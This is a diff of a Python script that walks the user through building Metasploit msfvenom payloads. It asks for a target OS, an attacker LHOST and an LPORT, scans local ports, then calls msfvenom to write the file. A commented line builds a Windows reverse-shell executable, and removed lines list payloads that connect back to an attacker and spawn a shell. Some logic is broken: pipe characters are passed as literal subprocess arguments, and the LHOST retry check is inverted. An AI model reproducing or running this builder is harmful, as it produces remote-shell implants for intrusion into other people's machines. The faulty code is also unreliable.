@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 #message
 #Varibles/Imports
 import os
@@ -13,6 +14,7 @@ baseSearch = ("msfvenom -l payloads |")
 finalPacket = ("msfvenom -p ")
 program_call = 'msfvenom'
 arg_one = '-p'
+test = "0"
 
 
 #allowable commands
@@ -60,6 +62,7 @@ def createPayload():
   print("   Options: linux, mac, windows")
   print()
   OS = input(Fore.WHITE + "Command Line: ")
+  opersystem = OS
 
   #If not command for OS
   operatingSystem = "linux", "windows", "mac"
@@ -69,12 +72,13 @@ def createPayload():
    print("Options: Linux, Mac, Windows")
    print()
    OS = input(Fore.WHITE + "Command Line: ")
+   opersystem = OS
   
   #Adds OS to search
   packetSearch = (str(baseSearch) + " grep " + str(OS) + " |")
   packetFinal = ""
 
-  while packetCreation == 1:
+  while packetCreation >= 1:
     os.system('cls' if os.name == 'nt' else "printf '\033c'")
 
     #Grep Question 2/...
@@ -83,21 +87,66 @@ def createPayload():
     print("   Note: If nothing else just press enter")
     print()
     OS = input(Fore.WHITE + "Command Line: ")
+
+    global test
     if OS == "":
       packetFinal = (str(packetSearch) + " grep -iv meterpreter | grep -v staged")
       packetCreation = 0
 
-    else:
+    if packetCreation == 1:
       packetSearch += (str(packetFinal) + " grep " + str(OS) + " |")
+      key = OS
+      test = "1"
+      packetCreation += 1
+    elif packetCreation == 2:
+      packetSearch += (str(packetFinal) + " grep " + str(OS) + " |")
+      twokey = OS
+      test = "2"                                                                                                                                          
+      packetCreation += 1
+    elif packetCreation == 3:
+      packetSearch += (str(packetFinal) + " grep " + str(OS) + " |")
+      threekey = OS
+      test = "3"
+      packetCreation += 1
+    
+  
+  arge_zero = "|"
+  arge_one = "grep"
+  arge_two = '-v'
+  arge_three = "meterpreter"
+  arge_four = "-v"
+  arge_five = "staged" 
+  program_call1 = "-l"
+  program_call2 = "payloads"
+  
   global finalPacket                                                              
-  os.system('cls' if os.name == 'nt' else "printf '\033c'")
-  print(Fore.RED + "Payload Search:")
-  print("   Targeted Search: " + str(packetFinal))
-  print("   Options: please type a targeted package from the list below if you would like to restart and search from something else please type -REDO-")
-  print()
   #Packages should be here after the end
-  print(Fore.GREEN + "linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell")
-  print("linux/x86/shell_reverse_tcp_ipv6                    Connect back to attacker and spawn a command shell over IPv6")
+  if test == "0":
+    os.system('cls' if os.name == 'nt' else "printf '\033c'")
+    print(Fore.RED + "Payload Search:")
+    print("   Targeted Search: " + program_call,program_call1,program_call2,arge_zero,arge_one,opersystem,arge_zero,arge_one,arge_two,arge_three,arge_zero,arge_one,arge_four,arge_five)
+    print("   Options: please type a targeted package from the list below if you would like to restart and search from something else please type -REDO-")
+    print(Fore.GREEN)
+    packet_return = subprocess.call([program_call,program_call1,program_call2,arge_zero,arge_one,opersystem,arge_zero,arge_one,arge_two,arge_three,arge_zero,arge_one,arge_four,arge_five])
+
+  if test == "1":
+    os.system('cls' if os.name == 'nt' else "printf '\033c'")
+    print(Fore.RED + "Payload Search:")
+    print("   Targeted Search: " + program_call,program_call1,program_call2,arge_zero,arge_one,opersystem,arge_zero,arge_one,key,arge_zero,arge_one,arge_two,arge_three,arge_zero,arge_one,arge_four,arge_five)
+    print("   Options: please type a targeted package from the list below if you would like to restart and search from something else please type -REDO-")
+    print(Fore.GREEN)
+    packet_return = subprocess.call([program_call,program_call1,program_call2,arge_zero,arge_one,opersystem,arge_zero,arge_one,key,arge_zero,arge_one,arge_two,arge_three,arge_zero,arge_one,arge_four,arge_five])
+    
+  
+  if test == "2":
+    os.system('cls' if os.name == 'nt' else "printf '\033c'")
+    print(Fore.RED + "Payload Search:")
+    print("   Targeted Search: " + program_call,program_call1,program_call2,arge_zero,arge_one,opersystem,arge_zero,arge_one,key,arge_zero,arge_one,twokey,arge_zero,arge_one,arge_two,arge_three,arge_zero,arge_one,arge_four,arge_five)
+    print("   Options: please type a targeted package from the list below if you would like to restart and search from something else please type -REDO-")
+    print(Fore.GREEN)
+    packet_return = subprocess.call([program_call,program_call1,program_call2,arge_zero,arge_one,opersystem,arge_zero,arge_one,key,arge_zero,arge_one,twokey,arge_zero,arge_one,arge_two,arge_three,arge_zero,arge_one,arge_four,arge_five])
+
+  
   print()
   global arg_two
   arg_two = input(Fore.WHITE + "Command Line: ")
@@ -112,40 +161,46 @@ def  Lportnhost():
   global arg_four
   os.system('cls' if os.name == 'nt' else "printf '\033c'")
   #Find Local Host Automation
-  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-  s.connect(("8.8.8.8", 80))
-  ip_address = s.getsockname()[0]
-  print(Fore.RED + "   Question 3: Let move onto building the file, is the IP below your current IP if yes please press enter if not please retype your LHOST in the command line? ")
-  print("   IP: " + str(ip_address))
+  # s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+  # s.connect(("8.8.8.8", 80))
+  # ip_address = s.getsockname()[0]
+  print(Fore.RED + "   Question 3: Let's move onto building the file, what is your LHOST in the command line? ")
+  # print("   IP: " + str(ip_address))
   print()
   OS = input(Fore.WHITE + "Command Line: ")
-  
+  ip_address = "LHOST="+OS
 
   #If Lhost wrong
   operatingSystem = ""
-  while OS not in operatingSystem:
+  while OS in operatingSystem:
    os.system('cls' if os.name == 'nt' else "printf '\033c'")
    print(Fore.RED + " What is your LHost that you want?")
    print()
    OS = input(Fore.WHITE + "Command Line: ")
-   ip_address = OS
+   ip_address = "LHOST="+OS
   
   finalPacket += ( " LHOST=" + str(ip_address))
 
   #Lport finder !!!
   os.system('cls' if os.name == 'nt' else "printf '\033c'")
   print(Fore.RED + "   Question 4: Pick an unused port ")
+  print()
+  for port in range(1, 65535):
+        with (socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as sock:
+            res = sock.connect_ex(('localhost', port))
+            if res == 0:
+                print(Fore.GREEN + "   Ports in use: " + str(port))
   # print("   IP: " + str(ip_address))
   print()
   OS = input(Fore.WHITE + "Command Line: ")
-  lPort = OS
+  lPort = "LPORT="+OS
 
   finalPacket += ( " LPORT=" + str(lPort))
 
   #Is script for linux or windows?
   os.system('cls' if os.name == 'nt' else "printf '\033c'")
   print(Fore.RED + "   Question 5: What format is the targeted machine? ")
-  print("   Options: windows, linux")
+  print("   Options: linux, windows, mac")
   print()
   OS = input(Fore.WHITE + "Command Line: ")
   typeOfMachine = OS
@@ -179,11 +234,11 @@ def finlization():
   global finalPacket
   os.system('cls' if os.name == 'nt' else "printf '\033c'")
   #Type of payload and naming payload
-  print(Fore.RED + "   Question 6: Lastly what would you like to name your packet? ")
+  print(Fore.RED + "   Question 6: Lastly what would you like to name your payload? ")
   print()
   OS = input(Fore.WHITE + "Command Line: ")
   arg_five = OS
-  arg_six = '-o'
+  arg_six = "-o"
   # finalPacket += ( " -o " + str(namePacket))
 
  
@@ -198,10 +253,9 @@ if userInput == "C" or userInput == "c":
 Lportnhost()
 finlization()
 os.system('cls' if os.name == 'nt' else "printf '\033c'")
-print(Fore.GREEN + finalPacket)
 # packet_call = str("'"+str(finalPacket.replace(" ","','"))+"'")
 # # print (packet_call)
-print(program_call,arg_one,arg_two,ip_address,lPort,arg_three,arg_four,arg_six,arg_five)
+print(Fore.GREEN + program_call,arg_one,arg_two,ip_address,lPort,arg_three,arg_four,arg_six,arg_five)
 return_code = subprocess.call([program_call,arg_one,arg_two,ip_address,lPort,arg_three,arg_four,arg_six,arg_five])
 print("output:", return_code)
 # # return_code = subprocess.call(['msfvenom','-p','windows/x64/shell_reverse_tcp','LHOST=10.0.2.15','LPORT=1337','-f','exe','-o','shell_test.exe'])
